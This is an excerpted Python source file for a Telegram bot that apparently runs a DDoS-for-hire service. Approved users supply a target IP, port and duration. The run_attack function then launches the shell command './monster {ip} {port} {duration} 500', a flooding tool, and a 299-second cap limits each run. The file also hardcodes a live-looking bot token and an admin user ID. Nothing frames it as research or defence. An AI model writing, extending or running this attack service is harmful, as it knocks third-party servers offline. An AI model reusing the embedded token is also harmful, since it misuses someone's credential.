...
TELEGRAM_BOT_TOKEN = '7277618290:AAFWYiUd7w5yJSGJC_y--mD958R8jNVb7cE'
ADMIN_USER_ID = 6123021407
...
async def add_user(update: Update, context: CallbackContext):
    ...
    if chat_id != ADMIN_USER_ID:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ **APPROVE LALO**.*", parse_mode='Markdown')
        return
...
async def run_attack(chat_id, ip, port, duration, context):
    ...
    try:
        command = f"./monster {ip} {port} {duration} 500"
...
async def attack(update: Update, context: CallbackContext):
    ...
    if user_id not in users or get_remaining_approval_time(user_id) == "Expired":
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ APPROVE LA LA.*", parse_mode='Markdown')
        return

    if attack_in_progress:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ **KISI OR BNDAVNA ATTACK LGA RKHA HA WAIT**.*", parse_mode='Markdown')
        return
    ...
    try:
        ...
        if duration > 299:
            response = "*⚠️ Error: Time interval must be less than or equal to 299 seconds.*"
            await context.bot.send_message(chat_id=chat_id, text=response, parse_mode='Markdown')
            return
    except ValueError:
